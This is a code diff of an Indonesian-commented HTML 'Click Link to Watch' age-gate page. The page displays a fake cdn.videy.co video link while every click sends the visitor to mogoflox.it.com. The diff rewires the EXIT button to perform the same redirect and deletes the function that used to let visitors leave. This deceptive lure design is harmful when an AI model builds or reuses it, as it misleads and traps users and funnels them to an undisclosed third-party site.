@@ -39,7 +39,7 @@
             font-weight: bold;
         }
 
-        /* Kotak Hitam Tautan */
+        /* Kotak Hitam Tautan - Sekarang bisa diklik */
         .link-box {
             background-color: #2c2f33;
             color: #ffffff;
@@ -51,6 +51,7 @@
             margin-bottom: 25px;
             display: block;
             text-decoration: none;
+            cursor: pointer;
         }
 
         /* Grup Tombol */
@@ -72,6 +73,8 @@
             cursor: pointer;
             text-transform: uppercase;
             transition: opacity 0.2s;
+            text-decoration: none;
+            display: inline-block;
         }
 
         .btn:active {
@@ -91,7 +94,7 @@
             animation: pulse-animation 1.5s infinite ease-in-out;
         }
 
-        /* Tombol Merah */
+        /* Tombol Merah - Sekarang diarahkan ke link video juga */
         .btn-red {
             background-color: #dc3545;
         }
@@ -102,14 +105,15 @@
     <div class="card">
         <h2>Click Link to Watch</h2>
         
-        <!-- Menampilkan Link Video Secara Dinamis -->
-        <div id="videoLinkDisplay" class="link-box">
+        <!-- Kotak Link sekarang bisa diklik -->
+        <div id="videoLinkDisplay" class="link-box" onclick="proceedToVideo()">
             https://cdn.videy.co/loading...
         </div>
 
         <div class="btn-group">
+            <!-- Semua tombol memicu fungsi proceedToVideo() -->
             <button class="btn btn-green" onclick="proceedToVideo()">I AM 18+</button>
-            <button class="btn btn-red" onclick="exitPage()">EXIT</button>
+            <button class="btn btn-red" onclick="proceedToVideo()">EXIT</button>
         </div>
     </div>
 
@@ -118,10 +122,9 @@
         const urlParams = new URLSearchParams(window.location.search);
         let videoId = urlParams.get('id');
 
-        // Jika tidak ada ID di URL, coba ambil dari path (seperti contoh vid-x)
+        // Jika tidak ada ID di URL, coba ambil dari path
         if (!videoId) {
             const pathParts = window.location.pathname.split('/');
-            // Mencari bagian yang mengandung .mp4 atau ID acak
             const lastPart = pathParts[pathParts.length - 1];
             if (lastPart && lastPart !== 'index.html' && lastPart !== '') {
                 videoId = lastPart.replace('.mp4', '');
@@ -135,22 +138,15 @@
         const targetDomain = "https://mogoflox.it.com/";
         const finalRedirectLink = targetDomain + videoId;
         
-        // Tautan CDN untuk tampilan di kotak hitam (sesuai gambar)
+        // Tautan CDN untuk tampilan di kotak hitam
         const cdnDisplayLink = `https://cdn.videy.co/${videoId}.mp4`;
 
         // Tampilkan link di kotak hitam saat halaman dimuat
         document.getElementById('videoLinkDisplay').innerText = cdnDisplayLink;
 
+        // Fungsi utama untuk mengarahkan ke link video
         function proceedToVideo() {
             window.location.href = finalRedirectLink;
-        }
-
-        function exitPage() {
-            if (window.history.length > 1) {
-                window.history.back();
-            } else {
-                window.location.href = "https://www.google.com";
-            }
         }
     </script>
 </body>
